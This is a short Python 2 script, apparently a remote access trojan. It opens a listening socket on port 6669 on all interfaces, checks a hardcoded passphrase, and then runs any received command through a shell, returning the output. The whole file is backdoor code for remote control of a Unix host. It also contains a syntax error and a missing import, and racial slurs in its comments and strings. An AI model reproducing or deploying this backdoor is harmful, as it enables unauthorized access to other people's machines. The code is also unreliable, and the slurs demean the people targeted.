#ECCENTRIC_HILLS - *NIX Server Deployment Binary
#Written by Gunnar Jones - gunSec
#https://github.com/acrinklaw/eccentric_hills
#grabbing our libraries
import socket
import threading
import os
import subprocess

#grab some easy system info to pass to client upon connection

#Set server to accept connections from any interface, port 6669
BINDIP = "0.0.0.0"
BINDPORT = 6669
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((BINDIP,BINDPORT))

#server can handle up to 3 concurrent sessions
server.listen(3)

def commands(command):
    command = command.rstrip()
    if command[0] != "!":
        try:
            result =  subprocess.check_output(command,stderr=subprocess.
STDOUT, shell=True)
        except:
            result = "Failed to execute command.\n"
    elif command[0] == "!":
        command = command[1:]
        result = "nibba punch"
    return result
    else:
        print "\nNgr wtf did you do, this should literally be impossible to call\n"
        sys.exit(1)

#main server functions, command parsing
def shell(clientSocket):
    while True:
        clientSocket.send("\n^-^")
        buffer = ""
        while "\n" not in buffer:
            buffer += clientSocket.recv(4096)
        if buffer == 'quit':
            clientSocket.send("[*] Terminating Connection. Goodbye.")
            clientSocket.close()
            break
        elif buffer == "\n":
            print ""
            continue
        else:
            output = commands(buffer)
            clientSocket.send(output)

#Client Handler, require predetermined hash/passphrase to establish connection
def handleClient(clientSocket):
    hashpass = clientSocket.recv(1024)
    if hashpass == 'gunclawpythonratniBBa':
        #send the w and uname to client, jump to shell loop
        clientSocket.send("\n[+] Accepted Connection\n")
        shell(clientSocket)
    else:
        clientSocket.close()


#Main, waiting for connection loop
def main():
    while True:
        client,addr = server.accept()
        clientHandler = threading.Thread(target=handleClient,args=(client,))
        clientHandler.start()


if __name__ == '__main__':
    main()
